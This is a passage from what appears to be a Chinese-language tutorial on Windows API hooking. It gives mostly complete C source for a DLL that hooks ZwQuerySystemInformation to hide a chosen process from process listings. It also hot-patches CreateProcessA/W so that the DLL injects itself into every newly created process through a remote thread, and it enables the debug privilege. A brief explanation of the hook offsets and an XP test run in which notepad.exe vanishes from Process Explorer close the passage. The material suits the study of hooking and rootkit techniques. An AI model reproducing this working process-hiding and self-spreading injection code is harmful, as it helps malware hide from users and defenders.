    {
        FARPROC prOrg = NULL;
        DWORD dwOldProtect = 0;
        DWORD dwAddress = 0;
        byte Buf[5] = { 0xE9,0, };
        PBYTE pByte = NULL;
        prOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName); //获取需要钩取的API的原始地址
        pByte = (PBYTE)prOrg; //将获取到的地址转化为一个指针方便后面的使用
        if (pByte[0] == 0xE9) //检查该处是否已处于挂钩状态,如果是则跳过挂钩过程    
            return FALSE;
        VirtualProtect((LPVOID)prOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect); //修改5个字节的内存保护权限（因为JMP指令只有5个字节）
        memcpy(pOrgbyte, prOrg, 5); //保存原始API开头的5个字节
        dwAddress = (DWORD)prNew - (DWORD)prOrg - 5;  //计算需要跳转的位置（JMP指令跳转的位置不是绝对地址，而是与当前位置的相对地址）
        //相对位置 = 目标位置 - 当前位置 - 指令长度（5字节）
        memcpy(&Buf[1], &dwAddress, 4); //获取跳转位置
        memcpy(prOrg, Buf, 5); //挂钩操作
        VirtualProtect((LPVOID)prOrg, 5, dwOldProtect, &dwOldProtect); //复原原始内存区域的安全权限
        return TRUE;
    }
    BOOL unhook_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgbyte) //脱钩函数
    {
        FARPROC pFunc = NULL;
        DWORD dwOldProtect = 0;
        PBYTE pByte = NULL;
        pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName); //获取 所需要钩取的API函数的原始地址
        pByte = (PBYTE)pFunc;
        if (pByte[0] != 0xE9) //判断是否已经处于脱钩状态
            return FALSE;
        VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
        memcpy(pByte, pOrgbyte, 5); //脱钩操作
        VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);
        return TRUE;
    }
    BOOL EnableDebugPriv() //提权函数
    {
        HANDLE hToken;
        LUID Luid;
        TOKEN_PRIVILEGES tkp;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        {
            printf("OpenProcessToken failed!\n");
            return FALSE;
        }
        if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Luid))
        {
            CloseHandle(hToken);
            printf("LookupPrivilegeValue failed!\n");
            return FALSE;
        }
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Luid = Luid;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof tkp, NULL, NULL))
        {
            printf("AdjustTokenPrivileges failed!");
            CloseHandle(hToken);
        }
        else
        {
            printf("privilege get!\n");
            return TRUE;
        }
    }
    BOOL inject(HANDLE hProcess, LPCTSTR szDllPath) //后面钩取CreateProcess后要在这个DLL内将DLL再次注入新创建的进程
    {
        HANDLE hThread = NULL;
        LPVOID lpRemoteBuf = NULL;
        DWORD BufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
        LPTHREAD_START_ROUTINE pThreadProc;
        lpRemoteBuf = VirtualAllocEx(hProcess, NULL, BufSize, MEM_COMMIT, PAGE_READWRITE); //为远程线程参数分配内存
        WriteProcessMemory(hProcess, lpRemoteBuf, (LPVOID)szDllPath, BufSize, NULL); //写入参数（即DLL路径）
        pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
        hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, lpRemoteBuf, 0, NULL); //创建远程线程
        WaitForSingleObject(hThread, INFINITE);
        VirtualFreeEx(hProcess, lpRemoteBuf, 0, MEM_RELEASE); //释放掉相应空间
        CloseHandle(hThread);
        return TRUE;
    }
    NTSTATUS WINAPI NewZwQuerySystemInformation(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID                    SystemInformation,
        ULONG                    SystemInformationLength,
        PULONG                   ReturnLength)
    {
        NTSTATUS status;
        FARPROC pFunc;
        PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
        unhook_code("ntdll.dll", "ZwQuerySystemInformation", g_OrgByteZwQSI); //先进行脱钩
        pFunc = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwQuerySystemInformation"); //获取原始API的地址
        //再次调用这个原始的API函数以获取进程信息
        status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
        if (status != STATUS_SUCCESS) //当API函数执行不成功时跳转至结束处理
        {
            goto __NTQUERYSYSTEMINFORMATION_END;
        }
        if (SystemInformationClass == SystemProcessInformation) //只关注SystemProcessInformation这一个类型的操作
        {
            //进行SystemProcessInformation的类型转换，现在pCur则是一个指向存储运行中所有进程结构体链表的链表头
            pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
            pPrev = NULL;
            while (TRUE)
            {
                //循环比较找到需要隐藏的目标程序的结构体
                if (pCur->Reserved2[1] != NULL)
                {
                    if (!_tcsicmp((PWSTR)pCur->Reserved2[1], PROC_TO_HIDE))
                    {
                        //当找到目标进程时有两种情况：1.下一个节点为0，也就是链表结束  2.下一个节点不为0
                        if (pCur->NextEntryOffset == 0)
                            pPrev->NextEntryOffset = 0; //直接把上一个节点的下一个成员值置为0
                        else
                            pPrev->NextEntryOffset += pCur->NextEntryOffset; //将上一个节点指向下一个节点的偏移加上当前节点指向下一个节点的偏移
                    }
                    else
                        pPrev = pCur; //没有匹配到则向下推进
                }
                if (pCur->NextEntryOffset == 0) //遍历到结尾则退出
                    break;
                pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset); //将当前的pCur移动至下一个节点
            }
        }
    __NTQUERYSYSTEMINFORMATION_END:
        // 函数终止前，再次执行API钩取操作，为下次调用准备
        hook_code("ntdll.dll", "ZwQuerySystemInformation", (PROC)NewZwQuerySystemInformation, g_OrgByteZwQSI);
        return status;
    }
    BOOL WINAPI NewCreateProcessA(
        LPCTSTR lpApplicationName,
        LPTSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCTSTR lpCurrentDirectory,
        LPSTARTUPINFO lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    )
    {
        BOOL bRet;
        FARPROC pFunc = NULL;
        //热补丁的钩取不用进行脱钩操作，只要将执行API函数的起始地址+2略过跳转指令即可
        pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");
        pFunc = (FARPROC)((DWORD)pFunc + 2);
        bRet = ((PFCREATEPROCESSA)pFunc)(
            lpApplicationName,
            lpCommandLine,
            lpProcessAttributes,
            lpThreadAttributes,
            bInheritHandles,
            dwCreationFlags,
            lpEnvironment,
            lpCurrentDirectory,
            lpStartupInfo,
            lpProcessInformation
            ); //重新调用CreateProcessA
        if (bRet) //向新创建的进程再次注入DLL
        {
            inject(lpProcessInformation->hProcess, INJECT_DLL);
        }
        return bRet;
    }
    BOOL WINAPI NewCreateProcessW(
        LPCTSTR lpApplicationName,
        LPTSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCTSTR lpCurrentDirectory,
        LPSTARTUPINFO lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    )
    {
        BOOL bRet;
        FARPROC pFunc = NULL;
        //热补丁的钩取不用进行脱钩操作，只要将执行API函数的起始地址+2略过跳转指令即可
        pFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessW");
        pFunc = (FARPROC)((DWORD)pFunc + 2);
        bRet = ((PFCREATEPROCESSW)pFunc)(
            lpApplicationName,
            lpCommandLine,
            lpProcessAttributes,
            lpThreadAttributes,
            bInheritHandles,
            dwCreationFlags,
            lpEnvironment,
            lpCurrentDirectory,
            lpStartupInfo,
            lpProcessInformation
            ); //重新调用CreateProcessW
        if (bRet) //向新创建的进程再次注入DLL
        {
            inject(lpProcessInformation->hProcess, INJECT_DLL); //CreateProcess创建的进程中lpProcessInformation这个参数中包含了对应进程的句柄
        }
        return bRet;
    }
    BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD  ul_reason_for_call,
        LPVOID lpReserved
    )
    {
        char szCurentProcName[MAX_PATH] = { 0, };
        char* p = NULL;
        EnableDebugPriv();
        GetModuleFileNameA(NULL, szCurentProcName, MAX_PATH);
        //1.异常处理：如果当前进程名字为HideProc.exe（即注入程序），则终止，不进行钩取。
        p = strrchr(szCurentProcName, '\\'); //获得当前进程的应用程序名
        if (p != NULL && !_stricmp(p + 1, "HideProc2.exe"))
            return TRUE;
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH: //进行API钩取
            hook_code("ntdll.dll", "ZwQuerySystemInformation", (PROC)NewZwQuerySystemInformation, g_OrgByteZwQSI);
            hook_code_hotpatch("kernel32.dll", "CreateProcessA", (PROC)NewCreateProcessA);
            hook_code_hotpatch("kernel32.dll", "CreateProcessW", (PROC)NewCreateProcessW);
            break;
        case DLL_PROCESS_DETACH: //将API进行脱钩，恢复其原始形态
            unhook_code("ntdll.dll", "ZwQuerySystemInformation", g_OrgByteZwQSI);
            unhook_code_hotpatch("kernel32.dll", "CreateProcessA");
            unhook_code_hotpatch("kernel32.dll", "CreateProcessW");
            break;
        }
        return TRUE;
    }
程序的逻辑并无太大的改变，主要是几个细节上的问题，下面来具体分析一下
## hook_code_hotpatch（unhook_code_hotpatch）：
首先要关注的就是原始缓冲区硬编码的变化：
    BYTE Buf[5] = { 0xE9,0, };
        byte buf2[2] = { 0xEB,0xF9 };
以及：
    byte Buf1[5] = { 0x90,0x90 ,0x90 ,0x90 ,0x90 };
        byte Buf2[2] = { 0x8B,0xFF };
第一个对应的是更改后的7个字节的数据：
0xE9代表JMP跳转指令，0xEB代表短跳转指令
第二个的0x90以及 0x8B,0xFF对应原来的空指令以及mov edi,edi
还有就是关于这里的具体跳转地址dwAddress的计算，根据前面的源码可以知道在5字节钩取的情况下，跳转地址的计算方式是：
    跳转地址 = 目标跳转地址 - 当前位置地址 - 指令长度（5字节）
其实这里道理是差不多的，只不过由于现在起始的位置是原始API开始的前5个字节处，所以现在这个计算方法应该写为：
    xxxxxxxxxx 跳转地址 = 目标跳转地址 - （当前位置地址-5） - 指令长度（5字节） = 目标跳转地址 - 当前位置地址
表现在代码中就是直接的：
    dwAddress = (DWORD)prNew - (DWORD)pFunc
## NewCreateProcessA\W：
在7字节钩取的条件下这两个函数的中间过程就变得更加简单（因为略去了挂钩与脱钩操作）
唯一需要注意的一点就是关于API的再次调用：
    pFunc = (FARPROC)((DWORD)pFunc + 2);
这里会将对应的API函数起始位置+2，也就是略过挂钩的部分，由于这两个字节对原始API的运行没有任何影响，所以可以直接略过来再次执行API函数。
# 运行测试：
本次运行在XP环境下实现：
首先是stealth.dll的注入：
首先在最开始的process exploer中是可以看到这个notepad.exe的进程的，这时运行注入程序注入DLL：
其中smss.exe这些系统进程有可能注入失败，影响不大，此时再看一下process explorer的界面：
原本notepad.exe的条目就消失了。然后卸载掉对应dll：
此时可以再次看见notepad.exe的条目。
在注入stealth2.dll之前要先将这个DLL放在系统system32的目录下（防止有些进程无法识别文件路径），然后执行注入操作：
（此时可以多开几个process explorer）打开的过程可能比较慢，因为钩取了进程创建的函数，存在线程优先的问题：
可以发现无论是原来的process explorer还是新打开的process
explorer里面都无法查到notepad.exe的条目。此时进行卸载操作：
可以发现原本被隐藏的notepad.exe又可以看到了